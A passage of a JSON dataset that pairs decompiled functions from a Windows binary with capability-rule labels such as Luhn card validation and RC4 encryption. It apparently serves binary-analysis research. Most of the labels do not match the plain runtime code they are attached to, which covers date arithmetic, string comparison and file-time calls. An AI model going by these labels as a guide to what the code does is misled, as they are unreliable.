        "decompiled_code": "\nvoid __fastcall fcn.00405e3c(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    char *pcVar2;\n    \n    arg_8h = 0;\n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 4) {\n            if (pcVar2[1] == '\\0') {\ncode_r0x00405e5d:\n                pcVar2 = pcVar2 + 1;\n                break;\n            }\n            if (pcVar2[2] == '\\0') {\ncode_r0x00405e5c:\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405e5d;\n            }\n            if (pcVar2[3] == '\\0') {\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405e5c;\n            }\n        }\n        arg_8h = pcVar2 - param_2;\n    }\n    if (arg_8h < 1) {\n        fcn.00405d28(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405670(arg_8h),  0 < iVar1)) {\n        fcn.00405e18();\n    }\n    else {\n        fcn.00405fa4();\n        fcn.00405670(arg_8h);\n        fcn.00405fa4();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00405fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fa4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00405d00();\n        iVar1 = fcn.00405ec8();\n        if (0 < iVar1) {\n            fcn.004030fc();\n        }\n    }\n    fcn.00405d18();\n    return;\n}\n",
        "token_count": 97
    },
    "00405fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fe8(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00406018();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "004060ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004060ac(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.004060f8();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "0040649c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0040649c(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 100
    },
    "00406928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406928(void)\n\n{\n    fcn.0040679c(&stack0x00000004);\n    return;\n}\n",
        "token_count": 31
    },
    "00406998": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00406998(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 84
    },
    "00407550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407550(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00406a10(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.00405620();\n        }\n        else {\n            fcn.00405728();\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00407754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407754(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 112
    },
    "00409774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409774(uint param_1, uint param_2)\n\n{\n    fcn.0040dbfc(param_1, param_2);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 50
    },
    "004099f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004099f0(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    if (in_EAX == 0) {\n        if (param_2 != 0) {\n            in_EAX = -*(param_2 + -4);\n        }\n        return in_EAX;\n    }\n    if (param_2 == 0) {\n        return *(in_EAX - 4);\n    }\n    uVar4 = *(param_2 + -4);\n    uVar10 = *(in_EAX - 4) - uVar4;\n    iVar6 = (-(*(in_EAX - 4) < uVar4) & uVar10) + uVar4;\n    iVar7 = -iVar6;\n    if (iVar7 != 0) {\n        do {\n            uVar1 = *(iVar7 + iVar6 + in_EAX);\n            uVar4 = uVar1;\n            uVar2 = *(iVar7 + param_2 + iVar6);\n            uVar8 = uVar2;\n            if (uVar4 != uVar8) {\n                if (uVar1 != uVar2) {\n                    uVar4 = uVar1 & 0xff;\n                    uVar8 = uVar2 & 0xff;\n                    cVar3 = uVar1 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar4 = uVar4 - 0x20;\n                    }\n                    cVar3 = uVar2 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar8 = uVar8 - 0x20;\n                    }\n                    if (uVar4 - uVar8 != 0) {\n                        return uVar4 - uVar8;\n                    }\n                    uVar4 = *(iVar7 + iVar6 + in_EAX);\n                    uVar8 = *(iVar7 + param_2 + iVar6);\n                    if (uVar4 >> 8 == uVar8 >> 8) goto code_r0x00409a7e;\n                }\n                uVar5 = uVar4 >> 8;\n                uVar9 = uVar8 >> 8;\n                cVar3 = uVar4 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar5 = uVar5 - 0x20;\n                }\n                cVar3 = uVar8 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar9 = uVar9 - 0x20;\n                }\n                if (uVar5 - uVar9 != 0) {\n                    return uVar5 - uVar9;\n                }\n            }\ncode_r0x00409a7e:\n            bVar11 = SCARRY4(iVar7, 2);\n            iVar7 = iVar7 + 2;\n        } while (bVar11 != iVar7 < 0);\n    }\n    return uVar10;\n}\n",
        "token_count": 756
    },
    "00409d78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d78(uint param_1, uint param_2)\n\n{\n    fcn.00409d2c(param_2);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 47
    },
    "00409d98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d98(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00409dcc(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 514
    },
    "00409e64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e64(uint arg_8h)\n\n{\n    fcn.00409d98();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 39
    },
    "00409e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409e8c(uint param_1)\n\n{\n    fcn.00409d2c(param_1);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 43
    },
    "00409eb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409eb4(uint arg_8h)\n\n{\n    fcn.00409d98();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 39
    },
    "00409f78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409f78(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040676c();\n    if (iVar1 == 0) {\n        fcn.00406928(1);\n        fcn.00405584();\n    }\n    iVar1 = fcn.0040676c();\n    if (iVar1 == 0) {\n        fcn.00406928(1);\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0040a08c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a08c(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040b784();\n    if (uVar1 == '\\0') {\n        fcn.00409f78();\n        fcn.00406774();\n        uVar1 = fcn.0040a008(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00406774();\n            uVar1 = fcn.0040a008(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x40a10c;\n    }\n    return uVar1;\n}\n",
        "token_count": 267
    },
    "0040a3b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a3b4(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFileTime;\n    uint lpLocalFileTime;\n    uint32_t wFatTime;\n    \n    wFatTime = param_2;\n    iVar1 = sub.kernel32.dll_DosDateTimeToFileTime(param_2 >> 0x10, param_2 & 0xffff, &lpLocalFileTime);\n    if (((iVar1 != 0) && (iVar1 = sub.kernel32.dll_LocalFileTimeToFileTime(&lpLocalFileTime, &lpFileTime),  iVar1 != 0))\n       && (iVar1 = sub.kernel32.dll_SetFileTime(),  iVar1 != 0)) {\n        return 0;\n    }\n    uVar2 = sub.kernel32.dll_GetLastError_1();\n    return uVar2;\n}\n",
        "token_count": 197
    },
    "0040a40c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0040a40c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack32;\n    int32_t iStack24;\n    uint *puStack20;\n    uint auStack16 [2];\n    \n    do {\n        puStack20 = auStack16;\n        if ((*(in_EAX + 0x20) & *(in_EAX + 0x18)) == 0) {\n            iStack24 = in_EAX + 0x34;\n            sub.kernel32.dll_FileTimeToLocalFileTime();\n            iStack32 = in_EAX + 2;\n            sub.kernel32.dll_FileTimeToDosDateTime(&iStack24);\n            *(in_EAX + 8) = *(in_EAX + 0x40);\n            *(in_EAX + 0xc) = *(in_EAX + 0x3c);\n            *(in_EAX + 0x10) = *(in_EAX + 0x20);\n            fcn.004057a0();\n            uVar2 = 0;\n            goto code_r0x0040a488;\n        }\n        puStack20 = in_EAX + 0x20;\n        auStack16[0] = *(in_EAX + 0x1c);\n        iVar1 = sub.kernel32.dll_FindNextFileA();\n    } while (iVar1 != 0);\n    uVar2 = sub.kernel32.dll_GetLastError_1();\ncode_r0x0040a488:\n    return CONCAT44(iStack32, uVar2);\n}\n",
        "token_count": 345
    },
    "0040a714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a714(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.004059dc(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 84
    },
    "0040a750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a750(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.0040649c(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.0040649c(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 248
    },
    "0040aac4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040aac4(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402f00();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 69
    },
    "0040b696": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b696(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0040b6b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b6b2(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 171
    },
    "0040b6e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b6e8(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0d4(0, 0xf, 0);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 60
    },
    "0040b718": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b718(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0d4(0, 0, 0);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 57
    },
    "0040b748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0040b748(void)\n\n{\n    char cVar1;\n    unkbyte10 Stack24;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5d4();\n    if (cVar1 == '\\0') {\n        fcn.00409774();\n    }\n    return Stack24;\n}\n",
        "token_count": 78
    },
    "0040b7a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7a0(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5d4();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040b7cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7cc(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5d4();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040b814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b814(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x492894);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x492898;\n        iVar2 = -(uVar1 / *0x492898);\n    }\n    else {\n        iVar2 = uVar1 / *0x492898;\n        uVar3 = uVar1 % *0x492898;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 232
    },
    "0040b858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0040b858(double *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_AX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = (in_AX * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40b8c4;\n        var_1h._0_1_ = 1;\n    }\n    return var_1h;\n}\n",
        "token_count": 212
    },
    "0040b8c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040b8c8(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_8h;\n    \n    cVar1 = fcn.0040b858(&var_8h, arg_8h & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.0040975c();\n    }\n    return _var_8h;\n}\n",
        "token_count": 95
    },
    "0040b908": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b908(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b814(arg_ch, arg_10h, &var_4h);\n    fcn.00409740(arg_ch);\n    fcn.00409740(in_EDX);\n    fcn.00409740(arg_8h);\n    return;\n}\n",
        "token_count": 106
    },
    "0040ba6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040ba6c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint auStack20 [2];\n    \n    puVar2 = auStack20;\n    cVar1 = fcn.0040b9a0(auStack20);\n    if (cVar1 == '\\0') {\n        fcn.0040975c();\n    }\n    return CONCAT44(auStack20[0], puVar2);\n}\n",
        "token_count": 102
    },
    "0040ba9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ba9c(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040b814(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.00409740(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.00409740(&var_eh);\n        fcn.00409740(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040b964();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4927f6 + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 604
    },
    "0040bc08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc08(void)\n\n{\n    double dVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    float10 fVar3;\n    uint uVar4;\n    uint uStack12;\n    \n    fVar3 = fcn.0040ba6c();\n    uStack12 = SUB84(fVar3, 0);\n    if (fVar3 < *0x40bc74) {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b8c8(uVar2);\n        dVar1 = CONCAT44(uStack12, uVar2) - fVar3;\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    else {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b8c8(uVar2);\n        dVar1 = fVar3 + CONCAT44(uStack12, uVar2);\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    return CONCAT44(uStack12, uVar4);\n}\n",
        "token_count": 277
    },
    "0040bc78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bc78(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040b814(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 71
    },
    "0040bca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bca0(void)\n\n{\n    float10 fVar1;\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime(auStack16);\n    fVar1 = fcn.0040ba6c();\n    return fVar1;\n}\n",
        "token_count": 64
    },
    "0040bccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bccc(void)\n\n{\n    float10 fVar1;\n    uint16_t uStack6;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040b8c8(uStack6);\n    return fVar1;\n}\n",
        "token_count": 63
    },
    "0040bd00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bd00(void)\n\n{\n    float10 fVar1;\n    ushort uStack16;\n    uint16_t uStack14;\n    uint uStack12;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040ba6c();\n    uStack12 = SUB84(fVar1, 0);\n    fVar1 = fcn.0040b8c8(uStack14);\n    return fVar1 + CONCAT44(uStack12, CONCAT22(uStack14, uStack16));\n}\n",
        "token_count": 119
    },
    "0040bd50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040bd50(void)\n\n{\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime();\n    return auStack16 & 0xffff;\n}\n",
        "token_count": 43
    },
    "0040bd64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd64(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.004030fc();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 129
    },
    "0040bdc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
